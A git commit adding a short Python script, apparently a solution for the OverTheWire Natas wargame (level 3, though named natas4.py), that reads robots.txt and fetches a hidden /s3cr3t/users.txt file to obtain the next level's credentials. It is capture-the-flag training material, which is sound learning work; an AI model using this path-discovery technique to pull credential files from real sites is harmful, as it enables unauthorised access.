12b541b5410dc64c89fdeafa1007cb2a7440be19
Made Jaya Setiawan <124169901+MadeJaya755@users.noreply.github.com>
2025-09-09 18:47:28 +0700

    Create natas4.py

---
+++ natas4.py
@@ -0,0 +1,15 @@
+import requests
+from requests.auth import HTTPBasicAuth
+
+# Kredensial Natas 3
+username = 'natas3'
+password = '<password_natas3>'
+base_url = 'http://natas3.natas.labs.overthewire.org/'
+
+# Step 1: Cek robots.txt
+res_robots = requests.get(base_url + 'robots.txt', auth=HTTPBasicAuth(username, password))
+print("robots.txt:\n", res_robots.text)
+
+# Step 2: Akses folder rahasia /s3cr3t/
+res_secret = requests.get(base_url + 's3cr3t/users.txt', auth=HTTPBasicAuth(username, password))
+print("\nusers.txt:\n", res_secret.text)
